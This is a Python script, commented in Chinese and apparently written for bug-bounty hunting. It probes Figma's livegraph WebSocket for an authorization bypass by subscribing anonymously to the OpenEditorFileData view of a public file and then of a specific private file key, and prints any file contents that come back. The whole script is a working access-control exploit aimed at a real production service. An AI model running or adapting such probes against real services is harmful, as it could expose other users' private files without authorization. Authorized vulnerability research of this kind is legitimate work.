"""Figma livegraph WS 匿名读取私有文件测试
OpenEditorFileData 视图：匿名订阅 公开文件 vs 私有文件
viewHash 与消息格式来自 anon_capture2.json（确定性来源）
若匿名订阅私有文件返回文件内容 -> 认证绕过（HTTP 403 但 WS 可读）
"""
import json, sys, time
import websocket

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

WS_URL_ANON = open(r"D:\scan\_figma_hunt\ws_url_anon.txt").read().strip()
COMMIT = "5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
HASH_OPEN_EDITOR = "3d578d4859a5845c2f037014898cd2e84f17ac3961ec9fa4b7f1d06c302e63c1"

PUBLIC_FILE = "bv2nMIdFf4u3dESGail4sm"
PRIVATE_FILE = "qzDqStIDJyGbthpKiuvfwg"  # 匿名 HTTP 403 确认私有

AUTH_MSG = {
    "messageType": "auth", "clientType": "web",
    "args": {"userId": None, "anonymousUserId": None},
    "tags": {"clientType": "web", "commitHash": COMMIT,
             "clientUrl": "https://www.figma.com/file/bv2nMIdFf4u3dESGail4sm"},
    "clientRequestedVersion": 2,
}


def run(file_key, label, wait=8):
    print(f"\n===== {label}: {file_key} =====")
    ws = websocket.create_connection(WS_URL_ANON, timeout=20,
                                     origin="https://www.figma.com",
                                     header=["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"])
    ws.send(json.dumps(AUTH_MSG))
    time.sleep(2)
    sub = {"messageType": "subscribe", "viewName": "OpenEditorFileData",
           "viewHash": HASH_OPEN_EDITOR, "loadType": "initial",
           "args": {"fileKey": file_key}}
    ws.send(json.dumps(sub))
    print("SENT subscribe OpenEditorFileData")

    hits, errors = 0, 0
    end = time.time() + wait
    while time.time() < end:
        try:
            ws.settimeout(min(3, end - time.time()))
            opcode, data = ws.recv_data()
            if opcode != 0x1:
                continue
            try:
                msg = json.loads(data)
            except Exception:
                continue
            mt = msg.get("messageType", "?")
            if mt == "denormalizedPendingMutations":
                for key, payload in msg.get("mutations", {}).items():
                    if "OpenEditorFileData" in key:
                        hits += 1
                        p = json.dumps(payload, ensure_ascii=False)
                        print(f"  [HIT] {key[:120]}")
                        print(f"        {p[:700]}")
            elif mt == "error":
                errors += 1
                print("  [ERR]", json.dumps(msg, ensure_ascii=False)[:250])
            elif mt == "viewLoaded":
                print("  viewLoaded:", msg.get("viewName"))
        except Exception:
            break
    ws.close()
    return hits, errors


if __name__ == "__main__":
    h1, e1 = run(PUBLIC_FILE, "基准: 公开文件")
    print(f"\n>> 公开文件: 命中 {h1}, error {e1}")
    h2, e2 = run(PRIVATE_FILE, "越权测试: 私有文件")
    print(f"\n>> 私有文件: 命中 {h2}, error {e2}")
